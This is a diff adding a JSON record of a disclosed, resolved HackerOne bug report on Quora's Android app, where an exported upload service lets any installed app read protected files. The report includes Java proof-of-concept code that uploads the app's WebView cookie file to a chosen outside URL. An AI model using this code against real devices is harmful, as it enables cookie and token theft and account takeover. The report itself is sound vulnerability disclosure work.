@@ -1,0 +1,240 @@
+{
+  "id": 258460,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTg0NjA=",
+  "url": "https://hackerone.com/reports/258460",
+  "title": "[Quora Android] Possible to steal arbitrary files from mobile device",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-08-09T22:24:55.836Z",
+  "submitted_at": "2017-08-09T22:24:55.836Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bagipro",
+    "url": "/bagipro",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 3152,
+    "url": "https://hackerone.com/quora",
+    "handle": "quora",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/152/57b2b1ab624538b6b1a515c5b03f929ef41e0dfd_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/152/57b2b1ab624538b6b1a515c5b03f929ef41e0dfd_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Quora",
+      "twitter_handle": "quora",
+      "website": "http://www.quora.com",
+      "about": "A place to share knowledge and better understand the world."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-08-30T18:35:24.358Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-08-30T18:35:24.301Z",
+  "team_member_agreed_on_going_public_at": "2017-08-30T18:34:28.463Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nService\n```xml\n<service android:enabled=\"true\" android:exported=\"true\" android:name=\"net.gotev.uploadservice.UploadService\"/>\n```\nenabled and exported. If it's exported, it means that any third party application can access it and send arbitrary data into it.\n\nThe following code sends main database file to arbitrary server (I used http://google.com/zaheck):\n```java\n        UploadTaskParameters params = new UploadTaskParameters();\n        params.setId(\"1337\");\n        params.setServerUrl(\"http://google.com/zaheck\");\n        try {\n            params.addFile(new UploadFile(\"/data/data/com.quora.android/app_webview/Cookies\"));\n\n        }\n        catch(FileNotFoundException e) {\n            throw new IllegalStateException(e); /* should be never thrown because not checked on the client side */\n        }\n\n        Intent intent = new Intent(\"net.gotev.uploadservice.action.upload\");\n        intent.setClassName(\"com.quora.android\", \"net.gotev.uploadservice.UploadService\");\n        intent.putExtra(\"taskClass\", \"net.gotev.uploadservice.MultipartUploadTask\");\n        intent.putExtra(\"multipartUtf8Charset\", true);\n        intent.putExtra(\"httpTaskParameters\", new HttpUploadTaskParameters());\n        intent.putExtra(\"taskParameters\", params);\n        startService(intent);\n```\nIn the result protected file ```/data/data/com.quora.android/app_webview/Cookies``` which is not accessible to any application besides yours is sent to the attacker. It's really serious vulnerability which allows to takeover accounts. It can be used by any third party installed application on the same device. On the newest Androids it also can be exploited via Instant Apps directly from a web-browser (installation of an app is not required).\n\n**Description (Include Impact):**\nI believe it's not your vulnerability, but the gotev's library you use. Anyway, attacker can steal files with settings, cookies (even httpOnly, it doesn't matter), google authorization token is stored in shared_prefs file, which also can be stolen\n\nPoC:\n{F211064}\n\nThis file contain sensitive cookies\n{F211066}\n\n### Steps To Reproduce\n I attached an apk file which sends ```/data/data/com.quora.android/app_webview/Cookies``` to http://google.com/zaheck\n\nInstall apk and open it, file with all cookies will be sent automatically to attacker provided URL\n",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 211064,
+      "file_name": "2017-08-10_01-13-31.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/211/064/c22580287ba784b348384eec01430fc466f6a248/2017-08-10_01-13-31.jpg?response-content-disposition=attachment%3B%20filename%3D%222017-08-10_01-13-31.jpg%22%3B%20filename%2A%3DUTF-8%27%272017-08-10_01-13-31.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXVUX6SEX%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T062257Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEhjvtzPMpD%2F5RselLATb786nXJZ8ZlRP%2FnaB3SoooyFAiEAvO%2BqYC%2Bu1NInBBEFBk4fjwKz93bv3iLs3XjQTKl3MMwqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDO2VwK9As%2BOFQhm%2BnyqPBT%2ByIpzRcYq6AZ2I2UE7DJ%2B8HvpwXsF8m3Th7qyi79WXcDHSJ4wA7X1NfkRtKv9lCuB0Bb3ocY%2BLYqyQ7IZ8KxUve7P0Hss1J1g%2B8CnZEV5U79R1kDriPtxqJ6occ2KtiJJjAXfa4IA3e%2Fy8r5JWN%2FQG2a2%2Fhfz3jZz6maQfgRFxxeWP1gg43j5yRdDvLw9RIWBnrT8uCPaYsP9BNagmTF%2F1GaXFWDeoLvEL4%2Bj6wlHe8OM%2FkPpVXjgT8h3YNdnsayUMSYV9t5jyAYTbLPH44p%2BG3TvGtt4I2a9QEYakFeIm9MWfqqQDdZsFfWj4cWdmuAuFaxOOFwjQq5JceSTC3Zzb38kiYB6qLuDxcTGHxQ6tmZMbLWTbF622JcOfsUZYcVisSU0Idwlgamce5rZxK3jBtpnq3GFWylmZe4wtFhAwvGPIn9Ak8VgaxEvzZHhT4PA6VKRhDFhkm2bU8Es4L4HFT98VqddyGNmRQE3Q%2BWF%2F%2F26B%2B6zkkoh5%2FVBsJmX1nVo5JZAJyBVNNfX5fKaqa0%2FZv3ixJM7FZsH%2FrtF1xUlwt%2B9oayzVPCcu5mJl6LPQimmZgsp1%2Fi7jaa%2FU7MMyQkiql27zS67J6yveS2rdM2o4hFFWKk%2Fe7O%2FFjTTSI%2B5WFYg463X3aA2mYQ%2BWm6bWFQ9BoNI1i4W%2B7qRHg7r1qBJiiMO355XdMDjr9hPibh0wTJjpnFcNAqm7%2B1G93SAX4PDVUNGnWse2a0GeDNpTklTTtfdcpDMpSkrm0Dt%2ByZ0PYFIZVFxVZ%2F8MiqVDOKHqrIwXDlY%2BLALL5hk51uwnifdbQCwkPRDs5CLil9cQxeD1QO9TGd%2B3l2GHfqex2r7eTmj94i6Zw5WssBRpQiVZ0QQw%2Brq30gY6sQHP%2BAmWg4zcyVxrFJDPkHPDx%2FxCszQ2s9zHUHbjpIfzovw2LzXNc9ImbYYj26aAgbuIawevmQh4o5i4JO37OX3Kc28bKYkL2dtPBHF5aLDRskSepLd6yCa%2FSKu18%2BxjTmVR6Dz6oV2AesgfU6MF%2BtDTe6ub2xxQb5oJ0tya9hDUG%2BAILrApJ%2Fvqizkb%2F01ikHMHIFlg11%2Bn2W3sM%2BfQEqj%2B3yF9cAtxby3x0veAf9XTYr4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f5cf3bee2852b6605030b87964259fa80954177a57b808dbffaf961b6a678c27",
+      "file_size": 545353,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 211066,
+      "file_name": "2017-08-10_01-21-39.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/211/066/86e48046ea2f7403d38a2f4bcfe85c8d5fbdcadb/2017-08-10_01-21-39.jpg?response-content-disposition=attachment%3B%20filename%3D%222017-08-10_01-21-39.jpg%22%3B%20filename%2A%3DUTF-8%27%272017-08-10_01-21-39.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXVUX6SEX%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T062257Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEhjvtzPMpD%2F5RselLATb786nXJZ8ZlRP%2FnaB3SoooyFAiEAvO%2BqYC%2Bu1NInBBEFBk4fjwKz93bv3iLs3XjQTKl3MMwqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDO2VwK9As%2BOFQhm%2BnyqPBT%2ByIpzRcYq6AZ2I2UE7DJ%2B8HvpwXsF8m3Th7qyi79WXcDHSJ4wA7X1NfkRtKv9lCuB0Bb3ocY%2BLYqyQ7IZ8KxUve7P0Hss1J1g%2B8CnZEV5U79R1kDriPtxqJ6occ2KtiJJjAXfa4IA3e%2Fy8r5JWN%2FQG2a2%2Fhfz3jZz6maQfgRFxxeWP1gg43j5yRdDvLw9RIWBnrT8uCPaYsP9BNagmTF%2F1GaXFWDeoLvEL4%2Bj6wlHe8OM%2FkPpVXjgT8h3YNdnsayUMSYV9t5jyAYTbLPH44p%2BG3TvGtt4I2a9QEYakFeIm9MWfqqQDdZsFfWj4cWdmuAuFaxOOFwjQq5JceSTC3Zzb38kiYB6qLuDxcTGHxQ6tmZMbLWTbF622JcOfsUZYcVisSU0Idwlgamce5rZxK3jBtpnq3GFWylmZe4wtFhAwvGPIn9Ak8VgaxEvzZHhT4PA6VKRhDFhkm2bU8Es4L4HFT98VqddyGNmRQE3Q%2BWF%2F%2F26B%2B6zkkoh5%2FVBsJmX1nVo5JZAJyBVNNfX5fKaqa0%2FZv3ixJM7FZsH%2FrtF1xUlwt%2B9oayzVPCcu5mJl6LPQimmZgsp1%2Fi7jaa%2FU7MMyQkiql27zS67J6yveS2rdM2o4hFFWKk%2Fe7O%2FFjTTSI%2B5WFYg463X3aA2mYQ%2BWm6bWFQ9BoNI1i4W%2B7qRHg7r1qBJiiMO355XdMDjr9hPibh0wTJjpnFcNAqm7%2B1G93SAX4PDVUNGnWse2a0GeDNpTklTTtfdcpDMpSkrm0Dt%2ByZ0PYFIZVFxVZ%2F8MiqVDOKHqrIwXDlY%2BLALL5hk51uwnifdbQCwkPRDs5CLil9cQxeD1QO9TGd%2B3l2GHfqex2r7eTmj94i6Zw5WssBRpQiVZ0QQw%2Brq30gY6sQHP%2BAmWg4zcyVxrFJDPkHPDx%2FxCszQ2s9zHUHbjpIfzovw2LzXNc9ImbYYj26aAgbuIawevmQh4o5i4JO37OX3Kc28bKYkL2dtPBHF5aLDRskSepLd6yCa%2FSKu18%2BxjTmVR6Dz6oV2AesgfU6MF%2BtDTe6ub2xxQb5oJ0tya9hDUG%2BAILrApJ%2Fvqizkb%2F01ikHMHIFlg11%2Bn2W3sM%2BfQEqj%2B3yF9cAtxby3x0veAf9XTYr4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ac235d0b3584b3ae4a1b0ecaadfcef2608f7128be1f96872bd52047330a7442f",
+      "file_size": 366561,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 211067,
+      "file_name": "app-release.apk",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/211/067/8d8fd55f14a85355d5d3691d6d5db737a73fa043/app-release.apk?response-content-disposition=attachment%3B%20filename%3D%22app-release.apk%22%3B%20filename%2A%3DUTF-8%27%27app-release.apk&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXVUX6SEX%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T062257Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEhjvtzPMpD%2F5RselLATb786nXJZ8ZlRP%2FnaB3SoooyFAiEAvO%2BqYC%2Bu1NInBBEFBk4fjwKz93bv3iLs3XjQTKl3MMwqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDO2VwK9As%2BOFQhm%2BnyqPBT%2ByIpzRcYq6AZ2I2UE7DJ%2B8HvpwXsF8m3Th7qyi79WXcDHSJ4wA7X1NfkRtKv9lCuB0Bb3ocY%2BLYqyQ7IZ8KxUve7P0Hss1J1g%2B8CnZEV5U79R1kDriPtxqJ6occ2KtiJJjAXfa4IA3e%2Fy8r5JWN%2FQG2a2%2Fhfz3jZz6maQfgRFxxeWP1gg43j5yRdDvLw9RIWBnrT8uCPaYsP9BNagmTF%2F1GaXFWDeoLvEL4%2Bj6wlHe8OM%2FkPpVXjgT8h3YNdnsayUMSYV9t5jyAYTbLPH44p%2BG3TvGtt4I2a9QEYakFeIm9MWfqqQDdZsFfWj4cWdmuAuFaxOOFwjQq5JceSTC3Zzb38kiYB6qLuDxcTGHxQ6tmZMbLWTbF622JcOfsUZYcVisSU0Idwlgamce5rZxK3jBtpnq3GFWylmZe4wtFhAwvGPIn9Ak8VgaxEvzZHhT4PA6VKRhDFhkm2bU8Es4L4HFT98VqddyGNmRQE3Q%2BWF%2F%2F26B%2B6zkkoh5%2FVBsJmX1nVo5JZAJyBVNNfX5fKaqa0%2FZv3ixJM7FZsH%2FrtF1xUlwt%2B9oayzVPCcu5mJl6LPQimmZgsp1%2Fi7jaa%2FU7MMyQkiql27zS67J6yveS2rdM2o4hFFWKk%2Fe7O%2FFjTTSI%2B5WFYg463X3aA2mYQ%2BWm6bWFQ9BoNI1i4W%2B7qRHg7r1qBJiiMO355XdMDjr9hPibh0wTJjpnFcNAqm7%2B1G93SAX4PDVUNGnWse2a0GeDNpTklTTtfdcpDMpSkrm0Dt%2ByZ0PYFIZVFxVZ%2F8MiqVDOKHqrIwXDlY%2BLALL5hk51uwnifdbQCwkPRDs5CLil9cQxeD1QO9TGd%2B3l2GHfqex2r7eTmj94i6Zw5WssBRpQiVZ0QQw%2Brq30gY6sQHP%2BAmWg4zcyVxrFJDPkHPDx%2FxCszQ2s9zHUHbjpIfzovw2LzXNc9ImbYYj26aAgbuIawevmQh4o5i4JO37OX3Kc28bKYkL2dtPBHF5aLDRskSepLd6yCa%2FSKu18%2BxjTmVR6Dz6oV2AesgfU6MF%2BtDTe6ub2xxQb5oJ0tya9hDUG%2BAILrApJ%2Fvqizkb%2F01ikHMHIFlg11%2Bn2W3sM%2BfQEqj%2B3yF9cAtxby3x0veAf9XTYr4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e39aa06eeb35bb252e72aec74c25a65aea70ebf4f9903558884d230ec10db725",
+      "file_size": 167984,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "he4am",
+    "flamezzz",
+    "jensec",
+    "sheikhrishad0",
+    "ta8ahi",
+    "thalaivar304",
+    "alesandroortiz",
+    "gerben_javado",
+    "flashdisk",
+    "2026",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 6003,
+      "category": "researcher",
+      "content": "> On the newest Androids it also can be exploited via Instant Apps directly from a web-browser (installation of an app is not required).\n\nIt actually was a mistake, services can be accessed by Instant Apps only in case when https://developer.android.com/reference/android/R.attr.html#visibleToInstantApps flag is enabled",
+      "updated_at": "2017-12-01T20:30:37.598Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 52239,
+        "username": "bagipro",
+        "name": "Sergey Toshin",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://oversecured.com/",
+        "location": "",
+        "created_at": "2016-01-21T22:43:16.784Z",
+        "url": "https://hackerone.com/bagipro",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/5d27521e1b671a8e8bc4f016cace6a876120e5addf7dcc35ae4a5eac091669a9"
+        }
+      }
+    }
+  ],
+  "databaseId": "258460",
+  "votes": 23,
+  "latest_disclosable_activity_at": "2017-08-30T18:35:24.380Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:22:58.026993",
+    "source": "https://hackerone.com/reports/258460.json",
+    "report_id": 258460
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTg0NjA=",
+    "databaseId": "258460",
+    "title": "[Quora Android] Possible to steal arbitrary files from mobile device",
+    "url": "https://hackerone.com/reports/258460",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2017-08-30T18:35:24.358Z",
+    "created_at": "2017-08-09T22:24:55.836Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE4",
+      "name": "Information Disclosure",
+      "external_id": "cwe-200"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "bagipro"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzMxNTI=",
+      "handle": "quora",
+      "name": "Quora",
+      "url": "https://hackerone.com/quora",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS81ODI0Ng==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-08-16T22:33:55.255Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI1ODQ2MA==",
+    "_id": "258460",
+    "disclosed": true,
+    "votes": 23,
+    "latest_disclosable_activity_at": "2017-08-30T18:35:24.380Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTg0NjA=",
+      "databaseId": "258460",
+      "title": "[Quora Android] Possible to steal arbitrary files from mobile device",
+      "url": "https://hackerone.com/reports/258460",
+      "disclosed_at": "2017-08-30T18:35:24.358Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzMxNTI=",
+      "handle": "quora",
+      "name": "Quora",
+      "url": "https://hackerone.com/quora",
+      "currency": "usd"
+    }
+  }
+}
